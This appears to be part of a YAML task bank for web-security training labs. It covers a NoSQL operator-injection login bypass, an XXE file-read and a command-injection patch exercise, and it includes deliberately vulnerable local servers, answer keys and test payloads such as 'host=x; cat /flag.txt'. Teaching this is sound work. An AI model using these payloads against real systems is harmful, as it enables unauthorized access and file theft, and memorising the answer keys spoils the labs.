- id: offsec-web-034
  title: Authentication bypass with a type confusion
  difficulty: 3
  kind: build
  tags: [web, nosql, type-confusion, auth-bypass, api]
  tutorial: |
    **What you're learning.** NoSQL injection / type confusion in a login.

    ### The idea

    A matcher that accepts a JSON **object** for a field lets you inject an operator: `{"$ne": ""}` ("not equal to empty") matches any password, so the first user logs in. Send `pass` as an object, not a string.

    ### Commands you'll use

    ```bash
    curl -s -X POST http://127.0.0.1:8093/login -H 'Content-Type: application/json' \
      -d '{"user":"admin","pass":{"$ne":""}}' | grep -oE 'KL\{[^}]+\}'
    curl -s -X POST http://127.0.0.1:8093/login -d '{"user":{"$ne":""},"pass":{"$ne":""}}'   # first user of all
    ```

    ### Common mistakes

    - Sending `pass` as a string: no injection.
    - Missing `Content-Type: application/json` so the body is parsed as form data.

    ### Check your work

    The login returns admin's flag without the real password.
  scenario: |
    The API login at **`http://127.0.0.1:8093/login`** takes JSON
    `{"user": ..., "pass": ...}`. If `pass` is an **object** `{"$ne": ""}` the
    matcher returns the first row regardless of the real password. Log in as
    **`admin`** without the password and read the flag it returns; write the
    `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`{\"user\":\"admin\",\"pass\":\"wrong\"}` fails."
    - "`{\"user\":\"admin\",\"pass\":{\"$ne\":\"\"}}` makes the password check pass."
    - "`curl -s -X POST http://127.0.0.1:8093/login -d '{\"user\":\"admin\",\"pass\":{\"$ne\":\"\"}}'`."
  solution: |
    ```bash
    curl -s -X POST http://127.0.0.1:8093/login -d '{"user":"admin","pass":{"$ne":""}}' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target nosqli 8093 <<'PY'
    import os, json, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8093"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    users = {"admin": os.urandom(8).hex(), "guest": "guest"}
    def matches(stored, supplied):
        if isinstance(supplied, dict):
            if "$ne" in supplied:
                return stored != supplied["$ne"]
            if "$gt" in supplied:
                return stored > supplied["$gt"]
        return stored == supplied
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            if self.path != "/login":
                self.send_response(404); self.end_headers(); return
            n = int(self.headers.get("Content-Length", "0"))
            try:
                d = json.loads(self.rfile.read(n) or b"{}")
            except Exception:
                d = {}
            u = d.get("user"); p = d.get("pass")
            ok = u in users and matches(users[u], p)
            b = (("Welcome admin. Flag: " + FLAG) if (ok and u == "admin") else "login failed").encode()
            self.send_response(200 if ok else 401); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b'POST /login {"user","pass"}')
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s -X POST http://127.0.0.1:8093/login -d '{"user":"admin","pass":{"$ne":""}}' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-035
  title: An XML parser that resolves entities
  difficulty: 3
  kind: build
  tags: [web, xxe, xml, file-disclosure]
  tutorial: |
    **What you're learning.** XXE to read a server-side file (offsec-web-004's Part 2).

    ### The idea

    The parser resolves external entities, so a `SYSTEM` entity reads a local file into the echoed `<name>`.

    ### Commands you'll use

    ```bash
    cat > /tmp/xxe.xml <<'XML'
    <?xml version="1.0"?>
    <!DOCTYPE user [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <user><name>&x;</name></user>
    XML
    curl -s -X POST --data-binary @/tmp/xxe.xml http://127.0.0.1:8094/import | grep -oE 'KL\{[^}]+\}'
    ```
    `--data-binary` preserves the XML exactly.

    ### Common mistakes

    - `--data` (mangles newlines).
    - A parser with entities disabled: then try parameter entities or OOB XXE.

    ### Check your work

    The echoed `<name>` contains `/flag.txt`'s flag.
  scenario: |
    The import endpoint at **`http://127.0.0.1:8094/import`** accepts an XML
    `POST` body and echoes the `<name>` field. Its parser resolves external
    entities. The flag is in **`/flag.txt`** on the server.

    Craft an XXE payload that reads `/flag.txt` into the echoed field, and
    write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "Normal body: `<user><name>Ana</name></user>`."
    - "Declare an entity and reference it: `<!DOCTYPE u [<!ENTITY x SYSTEM \"file:///flag.txt\">]>` then `<name>&x;</name>`."
    - "`curl -s -X POST --data-binary @payload.xml http://127.0.0.1:8094/import`."
  solution: |
    ```bash
    cat > /tmp/xxe.xml <<'XML'
    <?xml version="1.0"?>
    <!DOCTYPE user [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <user><name>&x;</name></user>
    XML
    curl -s -X POST --data-binary @/tmp/xxe.xml http://127.0.0.1:8094/import \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target xxe 8094 <<'PY'
    import os, re, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8094"))
    open("/flag.txt", "w").write(os.environ.get("FLAG", "KL{missing}") + "\n")
    os.chmod("/flag.txt", 0o644)
    def parse(xml):
        # a naive parser: expand <!ENTITY name SYSTEM "file://..."> references
        ents = {}
        for m in re.finditer(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"file://([^"]+)"\s*>', xml):
            try:
                ents[m.group(1)] = open(m.group(2)).read()
            except Exception:
                ents[m.group(1)] = ""
        body = re.sub(r'<!DOCTYPE.*?\]>', '', xml, flags=re.S)
        for k, v in ents.items():
            body = body.replace("&%s;" % k, v)
        m = re.search(r"<name>(.*?)</name>", body, re.S)
        return m.group(1) if m else ""
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            if self.path != "/import":
                self.send_response(404); self.end_headers(); return
            n = int(self.headers.get("Content-Length", "0"))
            name = parse(self.rfile.read(n).decode("utf-8", "replace"))
            b = ("Imported user: " + name).encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b"POST XML to /import")
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    cat > /tmp/xxe.xml <<'XML'
    <?xml version="1.0"?>
    <!DOCTYPE user [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <user><name>&x;</name></user>
    XML
    curl -s -X POST --data-binary @/tmp/xxe.xml http://127.0.0.1:8094/import | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    rm -f /tmp/xxe.xml

- id: offsec-web-039
  title: Patch the command injection
  difficulty: 3
  kind: fix
  tags: [web, command-injection, remediation, defense]
  tutorial: |
    **What you're learning.** The defender's side: patching command injection with an allowlist and `subprocess` arguments.

    ### The idea

    Two fixes together: **validate** the input (an allowlist of hostname characters) and **don't use a shell** (pass an argument list to `subprocess.run`, not a concatenated string to `os.system`).

    ### Commands you'll use

    ```python
    import re, subprocess
    if not re.fullmatch(r"[A-Za-z0-9.:-]+", host or ""):
        out = "invalid host"
    else:
        out = subprocess.run(["ping", "-c1", "-W1", host], capture_output=True, text=True, timeout=5).stdout
    ```
    ```bash
    curl -sG http://127.0.0.1:8098/ping --data-urlencode 'host=127.0.0.1' | head        # works
    curl -sG http://127.0.0.1:8098/ping --data-urlencode 'host=x; cat /flag.txt'          # rejected
    ```

    ### Common mistakes

    - Blacklisting `;` only: misses `|`, `$()`, newlines. Allowlist instead.
    - `shell=True` with a list: still invokes a shell.

    ### Check your work

    A normal host pings; an injection payload is rejected and runs nothing.
  scenario: |
    **`/lab/pingfix/app.py`** is the ping tool from before: it shells out with
    `os.system("ping -c1 " + host)`. Fix it so that:

    - it **still** pings a normal host and returns the output
    - command injection is **impossible** (`host=x; cat /flag.txt` must not run
      `cat`)
    - the flag file **`/flag.txt`** is never disclosed

    The check runs your app and tries an injection payload.
  hints:
    - "Replace `os.system(...)` with `subprocess.run([\"ping\", \"-c1\", \"-W1\", host], ...)` and no shell."
    - "Reject hosts that aren't plausible: allow only `[A-Za-z0-9.:-]`."
  solution: |
    ```python
    import re, subprocess
    if not re.fullmatch(r"[A-Za-z0-9.:-]+", host or ""):
        out = "invalid host"
    else:
        out = subprocess.run(["ping", "-c1", "-W1", host], capture_output=True, text=True, timeout=5).stdout
    ```
  setup: |
    rm -rf /lab/pingfix; mkdir -p /lab/pingfix
    FLAG=$(rand_flag); echo "$FLAG" > "$KL_STATE/flag"
    lab_file /lab/pingfix/app.py <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8098"))
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/ping":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/ping?host="); return
            host = urllib.parse.parse_qs(q.query).get("host", [""])[0]
            out = os.popen("ping -c1 -W1 " + host).read()   # vulnerable
            b = ("<pre>" + out + "</pre>").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    port=8098
    docker rm -f kl-pingfix >/dev/null 2>&1
    cp "$KL_STATE/flag" /lab/pingfix/flag.txt
    docker run -d --name kl-pingfix --restart unless-stopped -p 127.0.0.1:$port:$port -e PORT=$port \
      -v /lab/pingfix/app.py:/app/app.py:ro -v /lab/pingfix/flag.txt:/flag.txt:ro python:3.12-alpine python /app/app.py >/dev/null
    on_reset 'docker rm -f kl-pingfix >/dev/null 2>&1'
    eventually 20 "curl -fsS -o /dev/null 'http://127.0.0.1:$port/ping?host=127.0.0.1'"
    flag=$(cat "$KL_STATE/flag")
    ok=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=127.0.0.1')
    inj=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=127.0.0.1; cat /flag.txt')
    sub=$(curl -s "http://127.0.0.1:$port/ping" --get --data-urlencode 'host=$(cat /flag.txt)')
    check "a normal host still pings" 'grep -qiE "bytes from|PING|packets transmitted" <<<"$ok"'
    check_not "the injection does not leak the flag" 'grep -q "$flag" <<<"$inj$sub"'
  solve: |
    cat > /lab/pingfix/app.py <<'PY'
    import os, re, subprocess, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8098"))
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/ping":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/ping?host="); return
            host = urllib.parse.parse_qs(q.query).get("host", [""])[0]
            if not re.fullmatch(r"[A-Za-z0-9.:-]+", host or ""):
                out = "invalid host"
            else:
                out = subprocess.run(["ping", "-c1", "-W1", host], capture_output=True, text=True, timeout=5).stdout
            b = ("<pre>" + out + "</pre>").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
